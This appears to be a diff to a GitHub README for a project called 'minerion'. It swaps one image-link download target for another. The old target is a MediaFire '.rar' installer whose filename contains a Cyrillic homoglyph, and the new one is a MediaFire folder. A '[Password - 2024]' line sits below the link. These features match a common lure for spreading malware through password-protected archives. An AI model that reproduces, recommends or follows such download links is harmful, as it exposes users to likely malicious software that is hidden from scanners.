@@ -1,2 +1,3 @@
-[![bdui](https://github.com/rabelsmc/minerion/assets/82073844/8ab91bcb-202c-4717-ad7c-b2cf4c431227)]([https://github.com/rabelsmc/minerion/releases/download/Release/Setup.zip](https://download848.mediafire.com/auaxq8lbchxg1PsTDgLVLOUCa7QCfompKPtwklXOC25xXpFoB5pUYqZ9_TN3dd2_L9OOBoPMn0i6iSVvVy0U_FGAK63R6JMfEsKZGMJPbw4UCVuDvGOf5urKNUN7N3-NNp9Bl4h77C3s3iaQGBmYfsIJ3xvOgWYMq4HhU2vvdnNR/zpc96wa3gmcdc9g/Inst%D0%B0ller%21%21_Pswrd%21-2024.rar))
+[![bdui](https://github.com/rabelsmc/minerion/assets/82073844/8ab91bcb-202c-4717-ad7c-b2cf4c431227)](https://www.mediafire.com/folder/ucd754h1bqxrb/Folder))
+
 [Password - 2024]
